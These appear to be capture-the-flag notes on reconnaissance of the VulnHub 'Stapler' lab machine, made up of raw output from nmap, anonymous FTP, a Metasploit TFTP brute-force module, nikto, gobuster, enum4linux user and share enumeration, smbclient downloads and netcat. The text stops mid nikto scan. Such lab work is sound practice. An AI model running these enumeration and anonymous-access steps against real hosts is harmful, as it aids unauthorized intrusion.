ADDRESS 1 2.04 ms 192.168.56.101 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1211.06 seconds  192.168.56.101 - 20\\tcp 21\\tcp ftp 192.168.56.101 Connected to 192.168.56.101. 220- 220-|-----------------------------------------------------------------------------------------| 220-| Harry, make sure to update the banner when you get a chance to show who has access here | 220-|-----------------------------------------------------------------------------------------| 220- 220 Name (192.168.56.101:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 107 Jun 03 2016 note 226 Directory send OK. ftp\u0026gt; PWD ?Invalid command ftp\u0026gt; pwd 257 \u0026quot;/\u0026quot; is the current directory ftp\u0026gt; get note local: note remote: note 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for note (107 bytes). 226 Transfer complete. 107 bytes received in 0.00 secs (117.8040 kB/s) ftp\u0026gt; Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John. Connected to 192.168.56.101. 220- 220-|-----------------------------------------------------------------------------------------| 220-| Harry, make sure to update the banner when you get a chance to show who has access here | 220-|-----------------------------------------------------------------------------------------| 220- 220 Name (192.168.56.101:root): elly 331 Please specify the password. Password: 530 Login incorrect. Login failed. ftp\u0026gt; exit 221 Goodbye.  192.168.56.101 - 53\\tcp 53\\udp root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# dig google.nl @192.168.56.101 root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# dig red @192.168.56.101 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.11.5-P4-5.1+b1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; red @192.168.56.101 ;; global options: +cmd ;; connection timed out; no servers could be reached root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# dig a red @192.168.56.101 +trace ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.11.5-P4-5.1+b1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; a red @192.168.56.101 +trace ;; global options: +cmd ;; connection timed out; no servers could be reached  192.168.56.101 - 69\\udp msf5 auxiliary(scanner/tftp/tftpbrute) \u0026gt; show options Module options (auxiliary/scanner/tftp/tftpbrute): Name Current Setting Required Description ---- --------------- -------- ----------- CHOST no The local client address DICTIONARY /usr/share/metasploit-framework/data/wordlists/tftp.txt yes The list of filenames RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' RPORT 69 yes The target port THREADS 1 yes The number of concurrent threads (max one per host) msf5 auxiliary(scanner/tftp/tftpbrute) \u0026gt; set RHOSTS 192.168.56.101 RHOSTS =\u0026gt; 192.168.56.101 msf5 auxiliary(scanner/tftp/tftpbrute) \u0026gt; run [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf5 auxiliary(scanner/tftp/tftpbrute) \u0026gt;  192.168.56.101 - 80\\tcp nikto bashrc and profile have nothing\nnikto -h 192.168.56.101 - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 192.168.56.101 + Target Hostname: 192.168.56.101 + Target Port: 80 + Start Time: 2020-01-05 21:37:20 (GMT1) --------------------------------------------------------------------------- + Server: No banner retrieved + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + No CGI Directories found (use '-C all' to force check all possible dirs) + OSVDB-3093: /.bashrc: User home dir was found with a shell rc file. This may reveal file and path information. + OSVDB-3093: /.profile: User home dir with a shell profile was found. May reveal directory information and system configuration. + ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response + Scan terminated: 20 error(s) and 5 item(s) reported on remote host + End Time: 2020-01-05 21:37:37 (GMT1) (17 seconds) --------------------------------------------------------------------------- + 1 host(s) tested  gobuster ~/go/bin/gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sql,html,txt -t 40 -e =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://192.168.56.101 [+] Threads: 40 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,sql,html,txt [+] Expanded: true [+] Timeout: 10s =============================================================== 2020/01/05 21:39:08 Starting gobuster =============================================================== 2020/01/05 21:53:26 Finished ===============================================================  192.168.56.101 - 123\\tcp  192.168.56.101 - 139\\tcp enum4linux enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jan 5 21:52:37 2020 ========================== | Target Information | ========================== Target ........... 192.168.56.101 RID Range ........ 500-550,1000-1050 Username ......... '' Password ......... '' Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ====================================================== | Enumerating Workgroup/Domain on 192.168.56.101 | ====================================================== [+] Got domain/workgroup name: WORKGROUP ============================================== | Nbtstat Information for 192.168.56.101 | ============================================== Looking up status of 192.168.56.101 RED \u0026lt;00\u0026gt; - H \u0026lt;ACTIVE\u0026gt; Workstation Service RED \u0026lt;03\u0026gt; - H \u0026lt;ACTIVE\u0026gt; Messenger Service RED \u0026lt;20\u0026gt; - H \u0026lt;ACTIVE\u0026gt; File Server Service ..__MSBROWSE__. \u0026lt;01\u0026gt; - \u0026lt;GROUP\u0026gt; H \u0026lt;ACTIVE\u0026gt; Master Browser WORKGROUP \u0026lt;00\u0026gt; - \u0026lt;GROUP\u0026gt; H \u0026lt;ACTIVE\u0026gt; Domain/Workgroup Name WORKGROUP \u0026lt;1d\u0026gt; - H \u0026lt;ACTIVE\u0026gt; Master Browser WORKGROUP \u0026lt;1e\u0026gt; - \u0026lt;GROUP\u0026gt; H \u0026lt;ACTIVE\u0026gt; Browser Service Elections MAC Address = 00-00-00-00-00-00 ======================================= | Session Check on 192.168.56.101 | ======================================= [+] Server 192.168.56.101 allows sessions using username '', password '' ============================================= | Getting domain SID for 192.168.56.101 | ============================================= Domain Name: WORKGROUP Domain Sid: (NULL SID) [+] Can't determine if host is part of domain or part of a workgroup ======================================== | OS information on 192.168.56.101 | ======================================== Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464. [+] Got OS info for 192.168.56.101 from smbclient: [+] Got OS info for 192.168.56.101 from srvinfo: RED Wk Sv PrQ Unx NT SNT red server (Samba, Ubuntu) platform_id : 500 os version : 6.1 server type : 0x809a03 =============================== | Users on 192.168.56.101 | =============================== Use of uninitialized value $users in print at ./enum4linux.pl line 874. Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877. Use of uninitialized value $users in print at ./enum4linux.pl line 888. Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890. =========================================== | Share Enumeration on 192.168.56.101 | =========================================== Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers kathy Disk Fred, What are we doing here? tmp Disk All temporary files should be stored here IPC$ IPC IPC Service (red server (Samba, Ubuntu)) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP RED [+] Attempting to map shares on 192.168.56.101 //192.168.56.101/print$ Mapping: DENIED, Listing: N/A //192.168.56.101/kathy Mapping: OK, Listing: OK //192.168.56.101/tmp Mapping: OK, Listing: OK //192.168.56.101/IPC$ [E] Can't understand response: NT_STATUS_OBJECT_NAME_NOT_FOUND listing \\* ====================================================== | Password Policy Information for 192.168.56.101 | ====================================================== [+] Attaching to 192.168.56.101 using a NULL share [+] Trying protocol 445/SMB... [!] Protocol failed: [Errno Connection error (192.168.56.101:445)] timed out [+] Trying protocol 139/SMB... [+] Found domain(s): [+] RED [+] Builtin [+] Password Info for Domain: RED [+] Minimum password length: 5 [+] Password history length: None [+] Maximum password age: Not Set [+] Password Complexity Flags: 000000 [+] Domain Refuse Password Change: 0 [+] Domain Password Store Cleartext: 0 [+] Domain Password Lockout Admins: 0 [+] Domain Password No Clear Change: 0 [+] Domain Password No Anon Change: 0 [+] Domain Password Complex: 0 [+] Minimum password age: None [+] Reset Account Lockout Counter: 30 minutes [+] Locked Account Duration: 30 minutes [+] Account Lockout Threshold: None [+] Forced Log off Time: Not Set [+] Retieved partial password policy with rpcclient: Password Complexity: Disabled Minimum Password Length: 5 ================================ | Groups on 192.168.56.101 | ================================ [+] Getting builtin groups: [+] Getting builtin group memberships: [+] Getting local groups: [+] Getting local group memberships: [+] Getting domain groups: [+] Getting domain group memberships: ========================================================================= | Users on 192.168.56.101 via RID cycling (RIDS: 500-550,1000-1050) | ========================================================================= [I] Found new SID: S-1-22-1 [I] Found new SID: S-1-5-21-864226560-67800430-3082388513 [I] Found new SID: S-1-5-32 [+] Enumerating users using SID S-1-22-1 and logon username '', password '' S-1-22-1-1000 Unix User\\peter (Local User) S-1-22-1-1001 Unix User\\RNunemaker (Local User) S-1-22-1-1002 Unix User\\ETollefson (Local User) S-1-22-1-1003 Unix User\\DSwanger (Local User) S-1-22-1-1004 Unix User\\AParnell (Local User) S-1-22-1-1005 Unix User\\SHayslett (Local User) S-1-22-1-1006 Unix User\\MBassin (Local User) S-1-22-1-1007 Unix User\\JBare (Local User) S-1-22-1-1008 Unix User\\LSolum (Local User) S-1-22-1-1009 Unix User\\IChadwick (Local User) S-1-22-1-1010 Unix User\\MFrei (Local User) S-1-22-1-1011 Unix User\\SStroud (Local User) S-1-22-1-1012 Unix User\\CCeaser (Local User) S-1-22-1-1013 Unix User\\JKanode (Local User) S-1-22-1-1014 Unix User\\CJoo (Local User) S-1-22-1-1015 Unix User\\Eeth (Local User) S-1-22-1-1016 Unix User\\LSolum2 (Local User) S-1-22-1-1017 Unix User\\JLipps (Local User) S-1-22-1-1018 Unix User\\jamie (Local User) S-1-22-1-1019 Unix User\\Sam (Local User) S-1-22-1-1020 Unix User\\Drew (Local User) S-1-22-1-1021 Unix User\\jess (Local User) S-1-22-1-1022 Unix User\\SHAY (Local User) S-1-22-1-1023 Unix User\\Taylor (Local User) S-1-22-1-1024 Unix User\\mel (Local User) S-1-22-1-1025 Unix User\\kai (Local User) S-1-22-1-1026 Unix User\\zoe (Local User) S-1-22-1-1027 Unix User\\NATHAN (Local User) S-1-22-1-1028 Unix User\\www (Local User) S-1-22-1-1029 Unix User\\elly (Local User) [+] Enumerating users using SID S-1-5-21-864226560-67800430-3082388513 and logon username '', password '' S-1-5-21-864226560-67800430-3082388513-500 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-501 RED\\nobody (Local User) S-1-5-21-864226560-67800430-3082388513-502 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-503 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-504 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-505 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-506 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-507 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-508 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-509 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-510 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-511 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-512 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-513 RED\\None (Domain Group) S-1-5-21-864226560-67800430-3082388513-514 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-515 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-516 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-517 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-518 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-519 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-520 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-521 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-522 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-523 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-524 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-525 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-526 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-527 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-528 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-529 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-530 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-531 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-532 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-533 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-534 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-535 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-536 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-537 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-538 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-539 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-540 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-541 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-542 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-543 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-544 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-545 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-546 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-547 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-548 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-549 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-550 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1000 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1001 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1002 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1003 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1004 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1005 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1006 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1007 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1008 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1009 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1010 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1011 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1012 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1013 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1014 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1015 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1016 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1017 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1018 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1019 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1020 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1021 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1022 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1023 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1024 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1025 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1026 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1027 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1028 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1029 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1030 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1031 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1032 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1033 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1034 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1035 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1036 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1037 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1038 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1039 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1040 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1041 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1042 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1043 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1044 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1045 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1046 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1047 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1048 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1049 *unknown*\\*unknown* (8) S-1-5-21-864226560-67800430-3082388513-1050 *unknown*\\*unknown* (8) [+] Enumerating users using SID S-1-5-32 and logon username '', password '' S-1-5-32-500 *unknown*\\*unknown* (8) S-1-5-32-501 *unknown*\\*unknown* (8) S-1-5-32-502 *unknown*\\*unknown* (8) S-1-5-32-503 *unknown*\\*unknown* (8) S-1-5-32-504 *unknown*\\*unknown* (8) S-1-5-32-505 *unknown*\\*unknown* (8) S-1-5-32-506 *unknown*\\*unknown* (8) S-1-5-32-507 *unknown*\\*unknown* (8) S-1-5-32-508 *unknown*\\*unknown* (8) S-1-5-32-509 *unknown*\\*unknown* (8) S-1-5-32-510 *unknown*\\*unknown* (8) S-1-5-32-511 *unknown*\\*unknown* (8) S-1-5-32-512 *unknown*\\*unknown* (8) S-1-5-32-513 *unknown*\\*unknown* (8) S-1-5-32-514 *unknown*\\*unknown* (8) S-1-5-32-515 *unknown*\\*unknown* (8) S-1-5-32-516 *unknown*\\*unknown* (8) S-1-5-32-517 *unknown*\\*unknown* (8) S-1-5-32-518 *unknown*\\*unknown* (8) S-1-5-32-519 *unknown*\\*unknown* (8) S-1-5-32-520 *unknown*\\*unknown* (8) S-1-5-32-521 *unknown*\\*unknown* (8) S-1-5-32-522 *unknown*\\*unknown* (8) S-1-5-32-523 *unknown*\\*unknown* (8) S-1-5-32-524 *unknown*\\*unknown* (8) S-1-5-32-525 *unknown*\\*unknown* (8) S-1-5-32-526 *unknown*\\*unknown* (8) S-1-5-32-527 *unknown*\\*unknown* (8) S-1-5-32-528 *unknown*\\*unknown* (8) S-1-5-32-529 *unknown*\\*unknown* (8) S-1-5-32-530 *unknown*\\*unknown* (8) S-1-5-32-531 *unknown*\\*unknown* (8) S-1-5-32-532 *unknown*\\*unknown* (8) S-1-5-32-533 *unknown*\\*unknown* (8) S-1-5-32-534 *unknown*\\*unknown* (8) S-1-5-32-535 *unknown*\\*unknown* (8) S-1-5-32-536 *unknown*\\*unknown* (8) S-1-5-32-537 *unknown*\\*unknown* (8) S-1-5-32-538 *unknown*\\*unknown* (8) S-1-5-32-539 *unknown*\\*unknown* (8) S-1-5-32-540 *unknown*\\*unknown* (8) S-1-5-32-541 *unknown*\\*unknown* (8) S-1-5-32-542 *unknown*\\*unknown* (8) S-1-5-32-543 *unknown*\\*unknown* (8) S-1-5-32-544 BUILTIN\\Administrators (Local Group) S-1-5-32-545 BUILTIN\\Users (Local Group) S-1-5-32-546 BUILTIN\\Guests (Local Group) S-1-5-32-547 BUILTIN\\Power Users (Local Group) S-1-5-32-548 BUILTIN\\Account Operators (Local Group) S-1-5-32-549 BUILTIN\\Server Operators (Local Group) S-1-5-32-550 BUILTIN\\Print Operators (Local Group) S-1-5-32-1000 *unknown*\\*unknown* (8) S-1-5-32-1001 *unknown*\\*unknown* (8) S-1-5-32-1002 *unknown*\\*unknown* (8) S-1-5-32-1003 *unknown*\\*unknown* (8) S-1-5-32-1004 *unknown*\\*unknown* (8) S-1-5-32-1005 *unknown*\\*unknown* (8) S-1-5-32-1006 *unknown*\\*unknown* (8) S-1-5-32-1007 *unknown*\\*unknown* (8) S-1-5-32-1008 *unknown*\\*unknown* (8) S-1-5-32-1009 *unknown*\\*unknown* (8) S-1-5-32-1010 *unknown*\\*unknown* (8) S-1-5-32-1011 *unknown*\\*unknown* (8) S-1-5-32-1012 *unknown*\\*unknown* (8) S-1-5-32-1013 *unknown*\\*unknown* (8) S-1-5-32-1014 *unknown*\\*unknown* (8) S-1-5-32-1015 *unknown*\\*unknown* (8) S-1-5-32-1016 *unknown*\\*unknown* (8) S-1-5-32-1017 *unknown*\\*unknown* (8) S-1-5-32-1018 *unknown*\\*unknown* (8) S-1-5-32-1019 *unknown*\\*unknown* (8) S-1-5-32-1020 *unknown*\\*unknown* (8) S-1-5-32-1021 *unknown*\\*unknown* (8) S-1-5-32-1022 *unknown*\\*unknown* (8) S-1-5-32-1023 *unknown*\\*unknown* (8) S-1-5-32-1024 *unknown*\\*unknown* (8) S-1-5-32-1025 *unknown*\\*unknown* (8) S-1-5-32-1026 *unknown*\\*unknown* (8) S-1-5-32-1027 *unknown*\\*unknown* (8) S-1-5-32-1028 *unknown*\\*unknown* (8) S-1-5-32-1029 *unknown*\\*unknown* (8) S-1-5-32-1030 *unknown*\\*unknown* (8) S-1-5-32-1031 *unknown*\\*unknown* (8) S-1-5-32-1032 *unknown*\\*unknown* (8) S-1-5-32-1033 *unknown*\\*unknown* (8) S-1-5-32-1034 *unknown*\\*unknown* (8) S-1-5-32-1035 *unknown*\\*unknown* (8) S-1-5-32-1036 *unknown*\\*unknown* (8) S-1-5-32-1037 *unknown*\\*unknown* (8) S-1-5-32-1038 *unknown*\\*unknown* (8) S-1-5-32-1039 *unknown*\\*unknown* (8) S-1-5-32-1040 *unknown*\\*unknown* (8) S-1-5-32-1041 *unknown*\\*unknown* (8) S-1-5-32-1042 *unknown*\\*unknown* (8) S-1-5-32-1043 *unknown*\\*unknown* (8) S-1-5-32-1044 *unknown*\\*unknown* (8) S-1-5-32-1045 *unknown*\\*unknown* (8) S-1-5-32-1046 *unknown*\\*unknown* (8) S-1-5-32-1047 *unknown*\\*unknown* (8) S-1-5-32-1048 *unknown*\\*unknown* (8) S-1-5-32-1049 *unknown*\\*unknown* (8) S-1-5-32-1050 *unknown*\\*unknown* (8) =============================================== | Getting printer info for 192.168.56.101 | =============================================== No printers returned. enum4linux complete on Sun Jan 5 21:54:05 2020  smbclient - Kathy root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# smbclient \\\\\\\\192.168.56.101\\\\kathy Enter WORKGROUP\\root's password: Try \u0026quot;help\u0026quot; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Fri Jun 3 18:52:52 2016 .. D 0 Mon Jun 6 23:39:56 2016 kathy_stuff D 0 Sun Jun 5 17:02:27 2016 backup D 0 Sun Jun 5 17:04:14 2016 19478204 blocks of size 1024. 15929312 blocks available smb: \\\u0026gt; mask \u0026quot;\u0026quot; smb: \\\u0026gt; recurse ON smb: \\\u0026gt; prompt OFF smb: \\\u0026gt; lcd \u0026quot;/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler/smb/kathy\u0026quot; smb: \\\u0026gt; mget * getting file \\kathy_stuff\\todo-list.txt of size 64 as todo-list.txt (6.2 KiloBytes/sec) (average 6.2 KiloBytes/sec) getting file \\backup\\vsftpd.conf of size 5961 as vsftpd.conf (1455.3 KiloBytes/sec) (average 420.3 KiloBytes/sec) getting file \\backup\\wordpress-4.tar.gz of size 6321767 as wordpress-4.tar.gz (15993.8 KiloBytes/sec) (average 15448.7 KiloBytes/sec) smb: \\\u0026gt; put note note NT_STATUS_ACCESS_DENIED opening remote file \\note smb: \\\u0026gt; exit root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler#  wordpess backup file root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler/smb/kathy/backup# tar -zxvf/wordpress-4.tar.gz  no wp-config.php or other confug files.\nsmbclient - tmp root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# smbclient \\\\\\\\192.168.56.101\\\\tmp Enter WORKGROUP\\root's password: Try \u0026quot;help\u0026quot; to get a list of possible commands. smb: \\\u0026gt; mask \u0026quot;\u0026quot; smb: \\\u0026gt; recurse ON smb: \\\u0026gt; prompt OFF smb: \\\u0026gt; ldc \u0026quot;/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler/smb/tmp\u0026quot; ldc: command not found smb: \\\u0026gt; lcd \u0026quot;/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler/smb/tmp\u0026quot; smb: \\\u0026gt; mget * smb: \\\u0026gt; put note note putting file note as \\note (5.5 kb/s) (average 5.5 kb/s) smb: \\\u0026gt; dir . D 0 Mon Jan 6 17:23:25 2020 .. D 0 Mon Jun 6 23:39:56 2016 ls N 274 Sun Jun 5 17:32:58 2016 note A 107 Mon Jan 6 17:23:25 2020 19478204 blocks of size 1024. 15929208 blocks available smb: \\\u0026gt; del note smb: \\\u0026gt; ls . D 0 Mon Jan 6 17:23:45 2020 .. D 0 Mon Jun 6 23:39:56 2016 ls N 274 Sun Jun 5 17:32:58 2016 19478204 blocks of size 1024. 15929212 blocks available smb: \\\u0026gt; exit  192.168.56.101 - 666\\tcp root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# nc 192.168.56.101 666 ... message2.jpg ... root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# nc 192.168.56.101 666 \u0026gt;\u0026gt; message2 root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# file message2 message2: Zip archive data, at least v2.0 to extract root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# nc 192.168.56.101 666 \u0026gt;\u0026gt; message2 root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# file message2 message2: Zip archive data, at least v2.0 to extract root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# unzip message2 Archive: message2 warning [message2]: 11608 extra bytes at beginning or within zipfile (attempting to process anyway) inflating: message2.jpg root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# file message2.jpg message2.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 72x72, segment length 16, baseline, precision 8, 364x77, components 3 root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler/666# strings message2.jpg JFIF vPhotoshop 3.0 8BIM 1If you are reading this, you should get a cookie! root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler/666# exiftool message2.jpg ExifTool Version Number : 11.80 File Name : message2.jpg Directory : . File Size : 13 kB File Modification Date/Time : 2020:01:06 23:16:37+01:00 File Access Date/Time : 2016:06:03 17:03:38+02:00 File Inode Change Date/Time : 2020:01:06 23:16:37+01:00 File Permissions : rwxrwxrwx File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.01 Resolution Unit : None X Resolution : 72 Y Resolution : 72 Current IPTC Digest : 020ab2da2a37c332c141ebf819e37e6d Contact : If you are reading this, you should get a cookie! Application Record Version : 4 IPTC Digest : d41d8cd98f00b204e9800998ecf8427e Image Width : 364 Image Height : 77 Encoding Process : Baseline DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr  192.168.56.101 - 12380 nikto nikto -h 192.168.56.101:12380 - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 192.168.56.101 + Target Hostname: 192.168.56.101 + Target Port: 12380 --------------------------------------------------------------------------- + SSL Info: Subject: /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost Ciphers: ECDHE-RSA-AES256-GCM-SHA384 Issuer: /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost + Start Time: 2020-01-05 21:43:23 (GMT1) --------------------------------------------------------------------------- + Server: Apache/2.4.18 (Ubuntu) + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the 